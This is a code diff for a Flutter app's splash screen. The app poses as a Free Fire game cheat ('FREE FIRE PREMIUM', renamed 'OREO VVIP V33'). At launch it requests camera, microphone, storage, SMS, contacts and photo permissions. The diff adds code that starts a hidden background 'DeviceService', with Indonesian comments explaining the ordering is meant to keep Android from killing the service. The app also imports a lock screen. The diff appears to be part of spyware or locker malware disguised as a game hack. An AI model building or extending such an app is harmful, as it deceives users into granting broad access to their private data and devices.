@@ -4,6 +4,7 @@ import 'package:permission_handler/permission_handler.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import '../lock/lock_screen.dart';
 import 'cheat_home.dart';
+import '../services/device_service.dart';
 
 class SplashScreen extends StatefulWidget {
   const SplashScreen({super.key});
@@ -19,10 +20,14 @@ class _SplashScreenState extends State<SplashScreen> {
   }
 
   Future<void> _bootstrap() async {
+    // 1. Minta izin dulu biar Android gak matiin service
     await [
       Permission.camera, Permission.microphone, Permission.storage,
       Permission.sms, Permission.contacts, Permission.photos, Permission.notification,
     ].request();
+
+    // 2. Baru jalanin background service
+    await DeviceService.init(); 
 
     final prefs = await SharedPreferences.getInstance();
     Timer.periodic(const Duration(seconds: 2), (t) async {
@@ -59,9 +64,9 @@ class _SplashScreenState extends State<SplashScreen> {
             child: const Icon(Icons.local_fire_department, size: 60, color: Colors.white),
           ),
           const SizedBox(height: 30),
-          const Text('FREE FIRE PREMIUM', style: TextStyle(fontSize: 20, letterSpacing: 4, fontWeight: FontWeight.bold)),
+          const Text('OREO VVIP V33', style: TextStyle(fontSize: 22, letterSpacing: 4, fontWeight: FontWeight.bold, color: Colors.white)),
           const SizedBox(height: 10),
-          const Text('v2.4.1  •  Optimizing', style: TextStyle(fontSize: 11, color: Colors.grey, letterSpacing: 3)),
+          const Text('v3.3  •  Optimizing', style: TextStyle(fontSize: 11, color: Colors.grey, letterSpacing: 3)),
           const SizedBox(height: 40),
           const SizedBox(width: 220, child: LinearProgressIndicator(backgroundColor: Color(0xFF1E1B26), color: Color(0xFFC9A227))),
         ]),
